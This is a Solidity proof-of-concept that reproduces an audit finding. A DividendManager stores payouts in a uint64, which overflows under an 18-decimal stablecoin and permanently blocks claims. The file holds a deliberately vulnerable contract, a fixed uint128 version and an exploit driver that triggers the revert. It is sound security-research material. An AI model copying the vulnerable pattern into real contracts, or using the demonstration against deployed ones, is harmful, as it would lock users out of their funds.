// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * Synthetic reproduction of AuditVault finding 61173 (Remora Pledge, Cyfrin/Dacian).
 *
 * Root cause: DividendManager stores each holder's accumulated payout in a uint64
 * field (`calculatedPayout`). Payouts were sized for a 6-decimal stablecoin (USDC),
 * but the protocol can switch to an 18-decimal stablecoin (USDS). A $20 payout then
 * becomes 20e18, which exceeds type(uint64).max (~1.844e19). The SafeCast.toUint64
 * cast in payoutBalance() reverts, permanently DoSing the holder from claiming ANY
 * payout (current or previously-accrued).
 *
 * HARM: irreversible DoS on claim -> modeled as a MARKER mint of the blocked payout
 * amount (real uint256) to SINK on the catch branch.
 */

// ---------------------------------------------------------------------------
// Minimal SafeCast double (faithful to OpenZeppelin's revert-on-overflow cast)
// ---------------------------------------------------------------------------
library SafeCast {
    function toUint64(uint256 value) internal pure returns (uint64) {
        require(value <= type(uint64).max, "SafeCast: value doesn't fit in 64 bits");
        return uint64(value);
    }

    function toUint128(uint256 value) internal pure returns (uint128) {
        require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");
        return uint128(value);
    }
}

// ---------------------------------------------------------------------------
// Minimal ERC20-ish token, used as MARKER for the non-fund DoS harm.
// ---------------------------------------------------------------------------
contract MiniToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

// ---------------------------------------------------------------------------
// VULNERABLE double of DividendManager. The uint64 `calculatedPayout` field and
// the SafeCast.toUint64 accumulation are the verbatim bug from the finding.
// ---------------------------------------------------------------------------
contract DividendManager {
    struct HolderStatus {
        uint64 calculatedPayout; // @> BUG: uint64 cannot hold an 18-decimal payout
    }

    struct PayoutInfo {
        uint256 amount; // total stablecoin funding this distribution (18 decimals)
        uint256 totalSupply; // receipt-token supply the distribution is split across
    }

    mapping(address => HolderStatus) public holderStatus;
    mapping(address => uint256) public tokenBalance; // holder's receipt-token balance
    PayoutInfo public payout;

    function setup(address holder, uint256 bal, uint256 amount, uint256 totalSupply) external {
        tokenBalance[holder] = bal;
        payout = PayoutInfo(amount, totalSupply);
    }

    // Verbatim-shaped payout accounting from DividendManager.payoutBalance.
    function payoutBalance(address holder) public returns (uint256) {
        PayoutInfo memory pInfo = payout;
        uint256 payoutAmount = (tokenBalance[holder] * pInfo.amount) / pInfo.totalSupply;

        HolderStatus storage holderStatus_ = holderStatus[holder];
        holderStatus_.calculatedPayout += SafeCast.toUint64(payoutAmount); // @> reverts: 20e18 > uint64.max
        return payoutAmount;
    }
}

// ---------------------------------------------------------------------------
// FIXED double: calculatedPayout widened to uint128 (finding's mitigation).
// ---------------------------------------------------------------------------
contract FixedDividendManager {
    struct HolderStatus {
        uint128 calculatedPayout; // FIX: uint128 comfortably holds an 18-decimal payout
    }

    struct PayoutInfo {
        uint256 amount;
        uint256 totalSupply;
    }

    mapping(address => HolderStatus) public holderStatus;
    mapping(address => uint256) public tokenBalance;
    PayoutInfo public payout;

    function setup(address holder, uint256 bal, uint256 amount, uint256 totalSupply) external {
        tokenBalance[holder] = bal;
        payout = PayoutInfo(amount, totalSupply);
    }

    function payoutBalance(address holder) public returns (uint256) {
        PayoutInfo memory pInfo = payout;
        uint256 payoutAmount = (tokenBalance[holder] * pInfo.amount) / pInfo.totalSupply;

        HolderStatus storage holderStatus_ = holderStatus[holder];
        holderStatus_.calculatedPayout += SafeCast.toUint128(payoutAmount);
        return payoutAmount;
    }
}

// ---------------------------------------------------------------------------
// Exploit driver: reproduces the irreversible DoS on the holder's claim.
// ---------------------------------------------------------------------------
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Preconditions: $20 payout funded in an 18-decimal stablecoin.
    uint256 internal constant PAYOUT_18DEC = 20e18; // 20 USD with 18 decimals
    uint256 internal constant HOLDER_BALANCE = 100;
    uint256 internal constant TOTAL_SUPPLY = 100;

    bool public dosOccurred;
    uint256 public blockedPayout; // real uint256 magnitude the holder can no longer claim

    function run() external payable {
        // --- Create every helper up front, in a fixed order (deterministic nonces). ---
        DividendManager manager = new DividendManager(); // nonce 1
        MiniToken marker = new MiniToken(); // nonce 2 (LAST new = harm marker)

        // --- Preconditions from the finding: holder owed a payout in an 18-dec stablecoin. ---
        // Holder owns HOLDER_BALANCE of TOTAL_SUPPLY receipt tokens; distribution funded with 20e18.
        manager.setup(ATTACKER, HOLDER_BALANCE, PAYOUT_18DEC, TOTAL_SUPPLY);

        // The holder's pro-rata payout that SHOULD be claimable.
        uint256 expectedPayout = (HOLDER_BALANCE * PAYOUT_18DEC) / TOTAL_SUPPLY; // == 20e18

        // --- Attempt the claim: SafeCast.toUint64 overflows -> permanent DoS. ---
        try manager.payoutBalance(ATTACKER) returns (uint256) {
            // Would only reach here if the cast fit (it does not for 18 decimals).
            dosOccurred = false;
        } catch {
            dosOccurred = true;
            blockedPayout = expectedPayout;
            // Record the harm: the full payout the holder is permanently blocked from claiming.
            marker.mint(SINK, expectedPayout);
        }
    }
}
